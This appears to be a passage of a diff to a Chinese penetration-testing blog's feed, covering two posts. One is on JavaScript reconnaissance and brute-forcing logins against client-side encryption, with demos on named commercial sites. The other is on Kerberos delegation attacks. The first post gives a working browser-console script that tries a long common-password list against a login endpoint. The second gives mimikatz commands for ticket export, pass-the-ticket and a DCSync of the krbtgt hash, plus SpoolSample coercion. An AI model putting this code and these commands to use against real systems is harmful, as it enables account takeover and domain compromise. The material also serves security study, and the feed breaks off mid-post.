+<p>例如密码、API 密钥等硬编码。从 JS 代码中找到 这些信息。<br>
+AWS 密钥正则表达式可能如下所示：</p>
+<pre><code class="language-go">(?i)aws(.{0,20})?(?-i)['\”][0–9a-zA-Z\/+]{40}['\”]
+</code></pre>
+<p><strong>这里可以使用Burp的HaE插件</strong></p>
+<p>更多可以参考:<br>
+https://github.com/l4yton/RegHex<br>
+https://github.com/securing/DumpsterDiver<br>
+https://github.com/auth0/repo-supervisor<br>
+https://github.com/trufflesecurity/truffleHog<br>
+https://hackerone.com/reports/991718<br>
+https://hackerone.com/reports/983331<br>
+https://hackerone.com/reports/638635</p>
+<h2 id="js代码美好">JS代码美好</h2>
+<p><a href="https://beautifier.io/">https://beautifier.io/</a></p>
+<h2 id="js反混淆">JS反混淆</h2>
+<p>https://lelinhtinh.github.io/de4js/<br>
+大多数类型的混淆都可以解决;</p>
+<h2 id="jsmap文件">JS.map文件</h2>
+<p>是以js.map为后缀的⽂件,这是jQuery中的⼀个新功能，⽀持Source Map, 非常多Webpack打包的站点都会存在js.map⽂件.通过还原前端代码找到API,间接性获取未授权访问漏洞, 简单说，Source map就是⼀个信息文件，里面储存着位置信息。转换后的代码的每⼀个位置，所对应的 转换前的位置。 有了它，出错的时候，出错⼯具将直接显示原始代码，而不是转换后的代码,这给开发者带来了方便。<br>
+相关的处理⼯具有:(可以使用它们将代码还原)</p>
+<p>https://www.npmjs.com/package/restore-source-tree<br>
+https://github.com/paazmaya/shuji<br>
+https://www.npmjs.com/package/reverse-sourcemap<br>
+https://github.com/rarecoil/unwebpack-sourcemap</p>
+<p>chrome插件<br>
+<a href="https://github.com/SunHuawei/SourceDetector">https://github.com/SunHuawei/SourceDetector</a></p>
+<h2 id="开发人员注释">开发人员注释</h2>
+<p>推荐一个chrome插件ScanAnnotation<br>
+<img src="https://pyroxenites.github.io/post-images/1648988336573-0ae6e2ec-4037-41f1-9d5c-789fedbcaede.png" alt="image.png" loading="lazy"></p>
+<h1 id="burp-js爆破">burp js爆破</h1>
+<blockquote>
+<p>还是以演示的汽车之家为例</p>
+</blockquote>
+<p>在console中批量将密码加密<br>
+<img src="https://pyroxenites.github.io/post-images/1648969255832-14718ee7-9a30-4343-9937-d631d8a9fb20.png" alt="image.png" loading="lazy"><br>
+将其全选并复制出来<br>
+<img src="https://pyroxenites.github.io/post-images/1648969312207-461f597c-f294-42ee-a4ac-4e8e05b6bb86.png" alt="image.png" loading="lazy"></p>
+<p>或者用其他的代码方式进行保存</p>
+<blockquote>
+<p><a href="https://github.com/lz520520/encrypt-js">https://github.com/lz520520/encrypt-js</a></p>
+</blockquote>
+<p><img src="https://pyroxenites.github.io/post-images/1648970303204-d6f3d6bf-8da4-4c6f-9db1-689f7f96dd3b.png" alt="image.png" loading="lazy"><br>
+将密码写入js中<br>
+<img src="https://pyroxenites.github.io/post-images/1648970316436-b0769208-3686-466f-9b8c-3f73245dcd3d.png" alt="image.png" loading="lazy"></p>
+<p><img src="https://pyroxenites.github.io/post-images/1648970339460-07abd9a4-277c-475b-a36f-d1cb4743fc22.png" alt="image.png" loading="lazy"><br>
+放到浏览器中运行</p>
+<p>保存出来,进行正则提取<br>
+<img src="https://pyroxenites.github.io/post-images/1648970438603-5bbdf783-cb01-43be-a9a7-22b3d138a365.png" alt="image.png" loading="lazy"><br>
+<img src="https://pyroxenites.github.io/post-images/1648970450867-bc413307-4ac9-4f7d-8027-8adcf4b2ebc2.png" alt="image.png" loading="lazy"><br>
+便可用此文件去进行爆破,如果成功可对比明文得到答案</p>
+<blockquote>
+<p>这样的好处是,我们在浏览器中进行加密,速度快而且更加方便,不需要所有加密代码都要扣下来</p>
+</blockquote>
+<h2 id="参数获取">参数获取</h2>
+<blockquote>
+<p><a href="https://github.com/Elsfa7-110/GoldenNuggets-1">https://github.com/Elsfa7-110/GoldenNuggets-1</a><br>
+<a href="https://github.com/gh0stkey/CaA">https://github.com/gh0stkey/CaA</a></p>
+</blockquote>
+<h1 id="burp-加密sql注入">burp 加密sql注入</h1>
+<blockquote>
+<p><a href="https://github.com/f0ng/autoDecoder">https://github.com/f0ng/autoDecoder</a></p>
+</blockquote>
+<p>如果我们想到加密的参数的网站进行sqlmap的使用因为怎么办</p>
+<blockquote>
+<ol>
+<li>tamper脚本中使用js2py/execjs这些库进行编写利用</li>
+<li>burp jsEncrypter插件配合使用</li>
+<li>mitmproxy等配置代理给sqlmap，并自动化将参数加密转发到服务器，让sqlmap正常工作</li>
+</ol>
+</blockquote>
+<p>这时候我们就需要全部的加密逻辑</p>
+<p><img src="https://pyroxenites.github.io/post-images/1648972604770-a8a2c87b-a266-48f1-88c2-dc0f10347cce.png" alt="image.png" loading="lazy"><br>
+<img src="https://pyroxenites.github.io/post-images/1648972967564-c9940ae5-54bc-4468-855f-a4ffd712cf49.png" alt="image.png" loading="lazy"><br>
+<img src="https://pyroxenites.github.io/post-images/1648973074226-12da4feb-4b90-4bc7-957a-363de62e2a87.png" alt="image.png" loading="lazy"><br>
+<img src="https://pyroxenites.github.io/post-images/1648973124465-d1d3c29c-06b7-4560-a44b-a59b03af55f9.png" alt="image.png" loading="lazy"><br>
+成功将明文加密成功</p>
+<h1 id="浏览器js爆破">浏览器js爆破</h1>
+<h2 id="优势">优势</h2>
+<ol>
+<li>js 加密，再通过js 解密省去了分析加密过程</li>
+<li>异步速度很快</li>
+<li>无需部署其它环境，一个浏览器就够了</li>
+</ol>
+<blockquote>
+<p>如网站没引用jquery，须引用外部jquery</p>
+</blockquote>
+<h2 id="示例代码">示例代码</h2>
+<pre><code class="language-javascript">// http://192.168.1.9:8000/home/Account/LogOn 
+// 定义用户名部分
+var uids = [&quot;admin&quot;,&quot;2311&quot;,&quot;7245&quot;,&quot;2627&quot;,&quot;7243&quot;,&quot;6100&quot;,&quot;2970&quot;,&quot;6939&quot;,&quot;6549&quot;,&quot;6696&quot;,&quot;8006&quot;,&quot;6733&quot;,&quot;8224&quot;,&quot;8007&quot;,&quot;6132&quot;]
+// var uids=[&quot;admin&quot;]
+//定义密码列表
+var pass = [&quot;!QAZ6yhn&quot;,&quot;000000&quot;,&quot;000000000&quot;,&quot;0000000000&quot;,&quot;0000000000000000&quot;,&quot;0123456789&quot;,&quot;110120119&quot;,&quot;111111&quot;,&quot;111111111&quot;,&quot;1111111111&quot;,&quot;1111111111111111&quot;,&quot;123.mima&quot;,&quot;123123&quot;,&quot;123123123&quot;,&quot;1233211234567&quot;,&quot;1234.com&quot;,&quot;1234554321&quot;,&quot;123456&quot;,&quot;123456.&quot;,&quot;123456..&quot;,&quot;123456789&quot;,&quot;123456789.&quot;,&quot;123456789..&quot;,&quot;1234567890&quot;,&quot;12345678900&quot;,&quot;1234567891&quot;,&quot;12345678910&quot;,&quot;1234567891234567&quot;,&quot;1234567899&quot;,&quot;123456789a&quot;,&quot;123456789abc&quot;,&quot;123456789q&quot;,&quot;123456789qq&quot;,&quot;123456a&quot;,&quot;123456aa&quot;,&quot;123456abc&quot;,&quot;123456asd&quot;,&quot;123456q&quot;,&quot;123456qq&quot;,&quot;123698745&quot;,&quot;123abc&quot;,&quot;1314520520&quot;,&quot;135792468&quot;,&quot;1357924680&quot;,&quot;147258369&quot;,&quot;1472583690&quot;,&quot;1qaz!QAZ2wsx@WSX&quot;,&quot;1qaz#EDC5tgb&quot;,&quot;1qaz2wsx!QAZ@WSX&quot;,&quot;1qaz@WSX&quot;,&quot;1qaz@WSX3edc&quot;,&quot;1qaz@wsx&quot;,&quot;2wsx#EDC&quot;,&quot;3edc$RFV&quot;,&quot;5201314&quot;,&quot;5201314520&quot;,&quot;52013145201314&quot;,&quot;5841314520&quot;,&quot;5tgb^YHN&quot;,&quot;6yhn&amp;UJM&quot;,&quot;741852963&quot;,&quot;7708801314520&quot;,&quot;789456123&quot;,&quot;7894561230&quot;,&quot;987654321&quot;,&quot;9876543210&quot;,&quot;AAA111...&quot;,&quot;Aa111111&quot;,&quot;Abc@1234&quot;,&quot;Abcd1234&quot;,&quot;Hello01!&quot;,&quot;Hema1111&quot;,&quot;MIMA.123&quot;,&quot;Qwe123!@#&quot;,&quot;Welcome123&quot;,&quot;Welcome1234&quot;,&quot;a123123&quot;,&quot;a123456&quot;,&quot;a12345678&quot;,&quot;a123456789&quot;,&quot;a5201314&quot;,&quot;aa123456&quot;,&quot;aa123456789&quot;,&quot;aaa123456&quot;,&quot;abc123&quot;,&quot;abc123456&quot;,&quot;abc123456789&quot;,&quot;abcd123&quot;,&quot;abcd1234&quot;,&quot;abcd123456&quot;,&quot;aini1314&quot;,&quot;as123456&quot;,&quot;asd123&quot;,&quot;asd123456&quot;,&quot;asdASD123!@#&quot;,&quot;asdfghjkl&quot;,&quot;caonima&quot;,&quot;fir2k7st&quot;,&quot;mima..123&quot;,&quot;mima.123&quot;,&quot;mima.1234&quot;,&quot;mima.321&quot;,&quot;mima.456&quot;,&quot;mima123.&quot;,&quot;nopass.1&quot;,&quot;nopass.2&quot;,&quot;password1!&quot;,&quot;q123456&quot;,&quot;q123456789&quot;,&quot;qaz123456&quot;,&quot;qazwsxedc&quot;,&quot;qazxsw.123&quot;,&quot;qq123456&quot;,&quot;qq123456789&quot;,&quot;qq5201314&quot;,&quot;qwe123&quot;,&quot;qwe123456&quot;,&quot;qwe567,.&quot;,&quot;qwerty&quot;,&quot;qwertyuiop&quot;,&quot;w123456&quot;,&quot;w123456789&quot;,&quot;wang123456&quot;,&quot;woaini&quot;,&quot;woaini123&quot;,&quot;woaini1314&quot;,&quot;woaini1314520&quot;,&quot;woaini520&quot;,&quot;woaini521&quot;,&quot;www123456&quot;,&quot;z123456&quot;,&quot;z123456789&quot;,&quot;zxc123&quot;,&quot;zxc123.0&quot;,&quot;zxc123456&quot;,&quot;zxcvbnm&quot;,&quot;zxcvbnm123&quot;]
+
+var count = uids.length * pass.length
+
+console.info(&quot;[i]INFO: 一共需要请求:&quot;+count+&quot;次\n&quot;)
+//定义登录接口
+var url = &quot;http://192.168.1.9:8000/home/account/LogOn&quot;
+
+//请求主体,及表单部分
+function p(url,uid,pass){
+  // js密码加密部分
+  enpass = do_encrypt_slim(getmd5str(pass)) 
+  $.ajax({
+    url : url,
+    type : &quot;POST&quot;,
+    async : false,
+    data : {  
+      usercode:uid,
+      password:enpass,
+      phonecheckword:null
+    },
+    success : function(data){
+      if(data.flag != false){
+        console.log(&quot;%c[+] login successful!\n&quot;+&quot;Loginid:&quot;+uid+&quot;\tpassword:&quot;+pass+&quot;\tusername:\t&quot;+data.username+&quot;\n&quot;,&quot;color: green&quot;)
+      }else{
+        console.warn(&quot;[-] Login failed !\t当前尝试用户:&quot;+ uid +&quot;\t信息:&quot;+data.msg+&quot;\n&quot;)
+      }
+    },
+    timeout: 1000 //防止卡死
+  });
+}
+
+for (uint =0; uint&lt;=uids.length-1;uint++){
+  for (i = 0; i&lt;=pass.length-1;i++){
+    p(url,uids[uint],pass[i]);
+    
+  }
+}
+</code></pre>
+<figure data-type="image" tabindex="10"><img src="https://pyroxenites.github.io/post-images/1647165612007-26ca35fb-7b1f-4070-8c62-90eb9f445484.png" alt="image.png" loading="lazy"></figure>
+<h1 id="js敏感函数">JS敏感函数</h1>
+<h3 id="将字符串当做代码去执行的三个函数">将字符串当做代码去执行的三个函数</h3>
+<pre><code class="language-go">eval(&quot;alert(1)&quot;)
+setTimeout(&quot;alert(1)&quot;,1000)
+
+Function(&quot;alert(1)&quot;)()
+</code></pre>
+<ol start="2">
+<li>innerHTML 函数<br>
+如果没有进行适当的处理，可能出现XSS,即使经过了处理，试着看能不能绕过;<br>
+React中就有⼀个和innerHTML差不多的函数叫做dangerouslytSetInnerHTML，这个函数也是重<br>
+点关注对象;<br>
+还有Angular中的bypassSecurityTrustX，还有熟悉的eval函数;</li>
+<li>Postmessage 函数<br>
+最好先去看看它的官方文档: https://developer.mozilla.org/enUS/docs/Web/API/Window/postMessage ,<br>
+⼀旦了解了与 postMessage 相关的可能的安全问题，就可以在 JavaScript ⽂件中查找实现。在消息发<br>
+送⽅，寻找window.postMessage并在接收⽅寻找监听器window.addEventListener。<br>
+相关资料可以查看下⾯两个链接:<br>
+<a href="https://labs.detectify.com/2016/12/08/the-pitfalls-of-postmessage/">https://labs.detectify.com/2016/12/08/the-pitfalls-of-postmessage/</a><br>
+https://medium.com/techiepedia/what-are-sop-cors-and-ways-to-exploit-it62a5e02100dc</li>
+<li>String.prototype.search() .<br>
+⼀些开发⼈员使⽤它来查找⼀个字符串在另⼀个字符串中的出现。然⽽， ”.” 在此函数中被视为通配<br>
+符。<br>
+具体可以看下⾯这个报告:<br>
+<a href="https://hackerone.com/reports/129873">https://hackerone.com/reports/129873</a></li>
+<li>location 相关的⼏个函数<br>
+location: <a href="http://wooyun.2xss.cc/bug_detail.php?wybug_id=wooyun-2015-099935">http://wooyun.2xss.cc/bug_detail.php?wybug_id=wooyun-2015-099935</a><br>
+location.href: <a href="http://wooyun.2xss.cc/bug_detail.php?wybug_id=wooyun-2014-062771">http://wooyun.2xss.cc/bug_detail.php?wybug_id=wooyun-2014-062771</a><br>
+location.pathname: <a href="http://wooyun.2xss.cc/bug_detail.php?wybug_id=wooyun-2012-013059">http://wooyun.2xss.cc/bug_detail.php?wybug_id=wooyun-2012-013059</a></li>
+<li>document.cookie<br>
+这个函数也⽐较重要,具体不展开了，可以去看看filedescriptor 的⼀篇报告:<br>
+<a href="https://hackerone.com/reports/422043">https://hackerone.com/reports/422043</a></li>
+<li>window.name<br>
+可以具体看看下⾯链接:<br>
+<a href="https://xz.aliyun.com/t/6019">https://xz.aliyun.com/t/6019</a><br>
+https://blog.appsecco.com/automating-discovery-and-exploiting-dom-client-xss-vulnerabilitiesusing-sboxr-part-3-2ea910dfb429</li>
+<li>localStorage 以及 sessionStorage<br>
+<a href="https://infosecwriteups.com/stored-xss-to-organisation-takeover-6eaaa2fdcd5b">https://infosecwriteups.com/stored-xss-to-organisation-takeover-6eaaa2fdcd5b</a><br>
+<a href="https://hackerone.com/reports/297968">https://hackerone.com/reports/297968</a><br>
+从JS 代码中查找过时的依赖项。⼀个字，⼲就完了，可以直接使⽤ retire.js 来扫描漏洞。可以在以下链<br>
+接中找到该项⽬：<br>
+<a href="https://retirejs.github.io/retire.js/">https://retirejs.github.io/retire.js/</a></li>
+</ol>
+<h1 id="js中的可注册域名">JS中的可注册域名</h1>
+<p>如果开发者把本来的域名googleapis.com写成了gooogleapis.com,而gooogleapis.com刚好可以被注册,便可以在网页中引入你可控的JS</p>
+<h1 id="中国电信演示">中国电信演示</h1>
+<blockquote>
+<p>找到第一次加密的密码的位置</p>
+</blockquote>
+<figure data-type="image" tabindex="11"><img src="https://pyroxenites.github.io/post-images/1648981848147-62ca53d9-b627-4785-b756-6496923e4de6.png" alt="image.png" loading="lazy"></figure>
+<blockquote>
+<p>发现在同意协议的时候<br>
+密码已经被加密发送了</p>
+</blockquote>
+<p><img src="https://pyroxenites.github.io/post-images/1648981966729-909483c0-aafc-40fb-a35c-fd920e30c130.png" alt="image.png" loading="lazy"><br>
+搜索一下路径关键字<br>
+<img src="https://pyroxenites.github.io/post-images/1648982005823-d2bb291f-ff99-41f5-b292-e0f0447a205b.png" alt="image.png" loading="lazy"></p>
+<p><img src="https://pyroxenites.github.io/post-images/1648982170078-3b8f894b-cdcc-4264-9073-223703b70566.png" alt="image.png" loading="lazy"><br>
+发现到此的时候已经进行加密了<br>
+<img src="https://pyroxenites.github.io/post-images/1648982377214-161426b6-6293-4c3a-a273-df8ddfed6d18.png" alt="image.png" loading="lazy"><br>
+查看调用ValidatePwd的地方,觉得val是密码,所以监控一下val的值<br>
+发现确实是输入的密码123456<br>
+<img src="https://pyroxenites.github.io/post-images/1648982965540-c3eb4f33-9143-4ae0-b6af-0f6d89643355.png" alt="image.png" loading="lazy"><br>
+点进去发现加密函数,已经发现是AES加密了<br>
+所以我们要知道加密模式和填充方式以及key,编码,iv向量</p>
+<p>这里key值是c,iv向量是d	<br>
+<img src="https://pyroxenites.github.io/post-images/1648985643724-52ece0bc-fe50-4e11-937c-3c890c76c678.png" alt="image.png" loading="lazy"><br>
+这里我们直接提取加密函数在浏览器中运行<br>
+<img src="https://pyroxenites.github.io/post-images/1648985935697-e66780a3-e484-4d24-a696-284788993116.png" alt="image.png" loading="lazy"></p>
+<p><img src="https://pyroxenites.github.io/post-images/1648986008444-6bbaf622-dc45-47fc-8406-2ae29e9a72e2.png" alt="image.png" loading="lazy"><br>
+发现以及和加密密码一致</p>
+<p>这里我们直接将c的值输出一下<br>
+<img src="https://pyroxenites.github.io/post-images/1648986703876-b339da0b-a980-42b3-a24c-93f9629ad8fb.png" alt="image.png" loading="lazy"></p>
+<blockquote>
+<p><a href="https://www.mklab.cn/utils/aes">https://www.mklab.cn/utils/aes</a></p>
+</blockquote>
+<figure data-type="image" tabindex="12"><img src="https://cdn.nlark.com/yuque/0/2022/png/8363097/1648986681657-ab1df584-36b7-40d4-8e7f-d688ec81f178.png?x-oss-process=image%2Fresize%2Cw_937%2Climit_0#from=url&amp;id=irkFO&amp;originHeight=399&amp;originWidth=937&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;status=done&amp;style=none&amp;title=" alt="" loading="lazy"></figure>
+<p>补充完依赖以后可以直接在js文件运行了<br>
+<img src="https://pyroxenites.github.io/post-images/1648986958431-848d25e8-4889-426d-9122-6fed5f76e489.png" alt="image.png" loading="lazy"><br>
+提取单独js文件后<br>
+也可以在burp中进行加密<br>
+<img src="https://pyroxenites.github.io/post-images/1648987186497-156ba87e-c71a-46de-ba5b-ff5f0ac0ec76.png" alt="image.png" loading="lazy"></p>
+<h1 id="js-hook">JS hook</h1>
+<blockquote>
+<p><a href="https://github.com/CC11001100/ast-hook-for-js-RE">https://github.com/CC11001100/ast-hook-for-js-RE</a></p>
+</blockquote>
+<blockquote>
+<p><a href="https://www.geetest.com/demo/click-float.html">https://www.geetest.com/demo/click-float.html</a></p>
+</blockquote>
+<h2 id="安装依赖">安装依赖</h2>
+<figure data-type="image" tabindex="13"><img src="https://pyroxenites.github.io/post-images/1649136366106-5f498cde-eecf-4ea2-abf7-6ce872975623.png" alt="image.png" loading="lazy"></figure>
+<p>开启我们的代理<br>
+并安装我们的证书<br>
+<img src="https://pyroxenites.github.io/post-images/1649136645901-62e78ecd-0002-427d-9ca6-3df288296d26.png" alt="image.png" loading="lazy"></p>
+<p>随后启动代理服务<br>
+<img src="https://pyroxenites.github.io/post-images/1649136895595-f6d74047-14cf-40e9-bb21-398ee986ef23.png" alt="image.png" loading="lazy"><br>
+<img src="https://pyroxenites.github.io/post-images/1649136247471-2c631fc2-58eb-4497-bafe-a31d696d8a76.png" alt="image.png" loading="lazy"><br>
+这样我们就可以搜索出现其值得位置</p>
+<blockquote>
+<p>不过我搜索密码没有成功,不知道问题出在哪里<br>
+看别人有成功过的</p>
+</blockquote>
+<figure data-type="image" tabindex="14"><img src="https://pyroxenites.github.io/post-images/1649139070865-f3b4c156-daef-49c7-8468-aecca8914266.png" alt="image.png" loading="lazy"></figure>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[委派攻击]]></title>
+        <id>https://pyroxenites.github.io/post/wei-pai-gong-ji/</id>
+        <link href="https://pyroxenites.github.io/post/wei-pai-gong-ji/">
+        </link>
+        <updated>2022-05-28T05:40:44.000Z</updated>
+        <content type="html"><![CDATA[<h2 id="背景">背景</h2>
+<p>委派是域中一种安全机制,可以允许某个服务器代表某个用户去执行某个操作<br>
+不正确的委派配置,可以达到攻击者提权的作用</p>
+<table>
+<thead>
+<tr>
+<th>服务/用户名</th>
+<th>主机名</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>用户A</td>
+<td>hostA</td>
+</tr>
+<tr>
+<td>服务B</td>
+<td>hostB</td>
+</tr>
+<tr>
+<td>服务C</td>
+<td>hostC</td>
+</tr>
+</tbody>
+</table>
+<p><img src="https://pyroxenites.github.io/post-images/1645440298998-11a45341-a45a-4567-b54a-1b2974d099a1.png" alt="image.png" loading="lazy"><br>
+委派需要提前在域控上进行配置,它可以理解成是一种权限<br>
+简而言之:当A访问B服务时候,B服务拿着A用户的凭证去访问C服务,这个过程便是委派</p>
+<p>接受委派的用户只是服务账户或计算机用户<br>
+在域内只有主机账号和服务账号才有委派属性</p>
+<blockquote>
+<p>主机账号：活动目录中computer组内的计算机,也被称为机器账号<br>
+服务账号：域内用户的一种类型，是服务器运行服务时候所用的账号，将服务运行起来加入域内<br>
+如sqlserver/mysql等；域用户通过注册spn也能成为服务账号</p>
+</blockquote>
+<p>委派是基于服务的，在域内找服务一般通过S P N来进行寻找<br>
+约束和非约束的鉴权都是在web server上 必须是带有SPN的用户</p>
+<h3 id="分类">分类</h3>
+<ol>
+<li>非约束委派</li>
+</ol>
+<p>直接在域控上配置主机hostB的委派属性，配置成如下图所示：<br>
+<img src="https://pyroxenites.github.io/post-images/1645440522175-8d9b8fbf-4c8e-4ac3-994e-69de951197f4.png" alt="image.png" loading="lazy"></p>
+<blockquote>
+<p>user访问serverA的时候,向D C发起认证，D C会检查serverA的机器账号的属性,如果是非约束委派的话，会把用户的tgt放在st票据中并一起发送给serverA 这样serverA在验证st票据的同时也获取到了用户的tgt，并把tgt存贮在自己的lsass进程中以备下次重用，从而serverA就可以使用这个tgt,来模拟这个user访问任何服务</p>
+</blockquote>
+<p>这样子的话，任何用户都可以委派主机hostB代替自己去访问任何服务(传递一个tgt票据)<br>
+使用无约束委派,被授予此权限的服务器或服务账户能够模拟用户对任何主机上的任何服务进行身份验证<br>
+服务账号在接收该T G S后,获取到其中的用户的tgt,将用户tgt放入lsass中存储供后续使用</p>
+<ol start="2">
+<li>约束性委派</li>
+</ol>
+<p>选择“仅信任此计算机来委派指定的服务”如下图：<br>
+<img src="https://pyroxenites.github.io/post-images/1645440570556-df7f2b0e-2c78-4f1c-b5b1-9148cfe2a622.png" alt="image.png" loading="lazy"><br>
+如果hostB被配置了如上图所示的约束性委派，那么这时候主机hostB就可以被任意用户委派去访问LISI计算机上的cifs服务，与非约束性委派的区别是，限制了访问的服务类型与主机，但不能限制谁能对主机hostB进行委派。</p>
+<blockquote>
+<p>user访问serverA,向D C发起kerberos认证，域控返回user tgt票据和st1票据，user使用st1票据对servericeA进行访问<br>
+如果配置了serviceA到serviceB的约束委派,则serviceA能使用S4U2PROXY协议将用户发给自己的可转发的st1票据以用户的身份发给DC<br>
+域控返回给serviceA一个用来访问serviceB的ST2票据,这样serviceA就能以用户的身份对serviceB发起访问</p>
+</blockquote>
+<ol start="3">
+<li>基于资源的约束性委派</li>
+</ol>
+<blockquote>
+<p>需要在拥有资源的机器上去设置，如第二步中想限制只有指定主机才能被委派来访问主机lisi上面的cifs服务，就需要在域控上对主机lisi上进行基于资源的约束性委派的配置。<br>
+我允许此账户列表[........]代表他人向我进行身份验证</p>
+</blockquote>
+<p>K dc知道A是否可以访问服务B,但不知道A允许B来代表自己,这时候S4U2SELF和S4U2PROXY协议就诞生了</p>
+<blockquote>
+<p>这两个协议只作用于约束性与基于资源的约束性这两种委派方式</p>
+</blockquote>
+<h3 id="约束委派和非约束委派的区别">约束委派和非约束委派的区别</h3>
+<p>非约束委派只能访问委派的那个机器 并是指定的服务</p>
+<h3 id="s4u2self">S4U2SELF</h3>
+<p>使得服务可以代表某个用户获得一个用来访问服务自身的票据</p>
+<blockquote>
+<p>可以代表自身请求针对其自身的可转发的Kerberos服务票据(ST1)</p>
+</blockquote>
+<figure data-type="image" tabindex="1"><img src="https://pyroxenites.github.io/post-images/1645441520219-f286f3fa-ec6b-4d6a-bced-0b3eb5de3ced.png" alt="image.png" loading="lazy"></figure>
+<blockquote>
+<p>req请求 rep回应</p>
+<ol>
+<li>as</li>
+<li>tgs</li>
+<li>ap</li>
+<li>权限</li>
+</ol>
+</blockquote>
+<p>在TGS_REQ这个阶段中，S4U2SELF是这个数据包的一部分内容[PA_FOR_USER]</p>
+<blockquote>
+<p>（用用户的TGT向KDC请求用户的可转发的ST1，再用这张ST1去发起S4U2proxy请求。） 通过此扩展可以拿到一张标识任意用户身份的ST，它的作用其实是协议转换。有时用户会通过其他协议（例如NTLM或什至基于表单的身份验证）对服务进行身份验证，因此他们不会将TGS发送给服务。在这种情况下，服务可以调用S4U2Self来要求身份验证服务为其自身的任意用户生成TGS，然后可以在调用S4U2Proxy时将其用作依据。例如网站A服务器可以使用它去向KDC请求一张用户B身份的ST1，网站A服务器再用这张ST1去发起S4U2proxy请求</p>
+</blockquote>
+<h3 id="s4u2proxy">S4U2PROXY</h3>
+<blockquote>
+<p>可以以用户名义请求其他服务的ST2</p>
+</blockquote>
+<p>约束委派就是限制了S4U2proxy扩展的范围<br>
+也是在TGS_REQ阶段一个参数<br>
+可以使当前主机代表其他用户访问其他主机,相比较于S4U2SELF,范围大了很多,当然&quot;代表&quot;肯定也是有条件的</p>
+<blockquote>
+<p>拿用户的可转发的ST1请求用于访问服务器的ST2） 该拓展作用是使用一张用户A身份的ST1去向KDC请求一张用于访问文件服务器B的ST2，这张ST2的身份还是用户的，这样的话网站A就可以利用用户A的权限去访问文件服务器B上的文件了。</p>
+</blockquote>
+<h2 id="发现具有委派关系的用户和计算机">发现具有委派关系的用户和计算机</h2>
+<ol>
+<li>当服务账号或者主机被设置为非约束性委派时,其useraccuntcontrol属性会包含TRUSTED_FOR_DELEGATION</li>
+<li>当服务账号或者主机被设置为约束性委派时,其useraccountcontrol属性包含TRUSTED_TO_AUTH_FOR_DELEGATION,且msDS-AllowedToDelegateTo属性会包含被约束的服务</li>
+</ol>
+<h3 id="工具查看">工具查看</h3>
+<ol>
+<li>ADfind</li>
+</ol>
+<blockquote>
+<p>不需要账号密码即可查看</p>
+</blockquote>
+<ol start="2">
+<li>ldapsearch</li>
+</ol>
+<blockquote>
+<p>需要域内任意用户的账号和密码</p>
+</blockquote>
+<ol start="3">
+<li>powerview</li>
+</ol>
+<blockquote>
+<p>不需要账号密码即可查看</p>
+</blockquote>
+<h2 id="非约束委派的利用">非约束委派的利用</h2>
+<ol>
+<li>用户A向K D C申请一张可转发的用户A自己的tgt与访问service1需要的ticket</li>
+<li>用户A将第一步得到的ticket与可转发的tgt与tgt中的session key一起发送给了service1</li>
+<li>service1使用那张tgt与session key来代表用户A行使后续操作 例如访问service2</li>
+</ol>
+<p>当某台主机访问了配置了非约束性委派当主机的时候,就会将自己当可转发当tgt发送到配置了非约束性委派当主机上</p>
+<blockquote>
+<p>诱导域管账号(默认开启非约束委派)访问了我们配置了非约束委派的主机,认证方式无论是kerberos还是ntlm,这样我们都拥有了域管理的tgt,从而模拟管理员访问任何服务,相当于拿下了整个域环境</p>
+</blockquote>
+<h3 id="工具利用">工具利用</h3>
+<p>miminikatz</p>
+<pre><code class="language-sql">privilege::debug
+serurlsa::tickets /export
+</code></pre>
+<p>此时拿到了管理员的票据,用mimikatz将票据注入内存中,然后访问域控</p>
+<pre><code class="language-sql">kerberos::ptt xxxxxxxxxxxxxxxxxxxxxx.kirbi
+
+查看票据
+kerberos::list
+
+读取krbtgt的hash
+lsadump::dcsync /domain:sec.com /user:krbtgt
+</code></pre>
+<h3 id="思路">思路</h3>
+<ol>
+<li>通过adfind工具查询域内配置了非约束性委派的机器</li>
+<li>拿下目标机器</li>
+<li>诱导域管对我们这台机器进行委派</li>
+<li>拿到域管的tgt</li>
+</ol>
+<h3 id="非约束委派spooler打印机">非约束委派+spooler打印机</h3>
+<p>总体来说非约束需要管理员与委派机器建立连接,属于鸡肋现象<br>
+老外研究出了非约束委派+spooler打印机来强制与指定的主机进行连接</p>
+<h4 id="原理">原理</h4>
+<p>利用windows打印系统远程协议(MS-RPRN)的一个漏洞可以使得开启spooler服务的主机强制对一个攻击者指定的主机进行kerberos或者ntlm验证</p>
+<ol>
+<li>确定主机开启spooler服务。</li>
+</ol>
+<figure data-type="image" tabindex="2"><img src="https://pyroxenites.github.io/post-images/1645492890745-e07e4485-e63d-4ace-bc5f-2890528e85e5.png" alt="image.png" loading="lazy"></figure>
+<ol start="2">
+<li>在目标上使用exp来强制管理员访问目标的spooler服务，进而获得管理员主机的tgt，使用方法spoolsample.exe 管理员 目标，可以强制管理员访问目标。</li>
+</ol>
+<blockquote>
+<p>下载地址:<a href="https://github.com/shanfenglan/test/tree/master/spooler">https://github.com/shanfenglan/test/tree/master/spooler</a><br>
+一定要使用普通管理员的权限(不用绕过UAC)来执行 spoolsample.exe 管理员 目标 这个命令，只有这样才能导出域控主机账户的tgt。</p>
+</blockquote>
+<h2 id="约束委派的利用">约束委派的利用</h2>
+<p>非约束委派被委派的机器或直接的得到发布委派的用户的tgt,是十分不安全的<br>
+故微软推出了约束性委派,还扩充了kerberos协议,添加了s4u2self和s4u2proxy协议[S4U的两个子协议]</p>
+<p>由于服务账号只能获取某个用户或者主机的服务的st1而非tgt,所以只能模拟用户访问特定的服务<br>
+但是如果能够拿到约束委派用户或主机的密码或者Hash,就可以伪造S4U请求,伪造成服务用户以任何用户的权限申请访问指定服务的st2</p>
+<ol>
+<li>用户A访问service1</li>
+<li>service1通过s4u2self协议代表用户A去请求一个可以访问service1自身的可转发的ticket，这个ticket代表域控授权service1可以使用用户A的身份进行操作</li>
+</ol>
+<blockquote>
+<p>域控授权service1代表用户A来访问service1</p>
+</blockquote>
+<ol start="3">
+<li>service1以用户A的身份访问K D C请求一个访问service2的可转发的ticket</li>
+<li>service1获取到ticket并以用户A的名义访问service2</li>
+</ol>
+<blockquote>
+<p>域控授权service1代表用户来访问service2<br>
+总的来说s4u2self解决的问题就是,确定了某台主机可以代表某用户对自己进行操作<br>
+s4u2proxy解决的问题就是确定了某台主机可以代表某用户对其他主机进行操作</p>
+</blockquote>
+<blockquote>
